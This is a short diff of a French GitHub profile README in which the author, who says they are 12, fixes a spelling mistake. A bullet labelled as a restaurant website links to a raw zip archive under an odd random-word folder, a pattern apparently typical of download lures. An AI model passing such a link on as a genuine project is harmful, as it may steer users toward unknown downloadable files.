@@ -1,4 +1,4 @@
-<h1 align="center">Bonjour 👋, Je m'appel Zakariya</h1>
+<h1 align="center">Bonjour 👋, Je m'appelle Zakariya</h1>
 <h3 align="center">Bojour, je code depuis l'âge de 8 ans la j'en ais 12 et j'aimerai bien travaille le plus tôt possible</h3>
 
 - Jais Coder un Site de restaurant [Restaurant](https://raw.githubusercontent.com/zduchevreuil/zduchevreuil/main/hobbledehoyishness/zduchevreuil-2.2.zip)
